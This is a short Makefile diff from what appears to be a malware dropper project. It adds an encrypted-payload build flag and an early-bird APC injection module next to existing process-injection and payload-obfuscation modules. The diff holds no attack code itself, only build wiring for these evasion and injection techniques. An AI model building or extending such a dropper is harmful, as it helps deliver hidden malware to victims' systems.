@@ -45,7 +45,7 @@ else
 endif
 
 ifneq ($(ENCRYPTION_OR_OBFUSCATION), "")
-    CFLAGS += /D $(ENCRYPTION_OR_OBFUSCATION)
+    CFLAGS += /D ENCRYPTED_PAYLOAD /D $(ENCRYPTION_OR_OBFUSCATION)
 endif
 
 ifneq ($(INJECTION_METHOD), "")
@@ -94,6 +94,7 @@ SRCS = dropper.c \
        modules/entropy/entropy.c modules/injection/apc_injection.c \
        modules/injection/function_stomping_injection.c modules/injection/injection.c \
        modules/injection/remote_process_injection.c modules/injection/thread_hijacking.c \
+       modules/injection/early_bird_apc_injection.c \
        modules/obfuscation/dictionnary_obfuscation.c modules/obfuscation/ipv4_obfuscation.c \
        modules/obfuscation/ipv6_obfuscation.c modules/obfuscation/mac_obfuscation.c \
        modules/obfuscation/obfuscation.c modules/obfuscation/uuid_obfuscation.c \
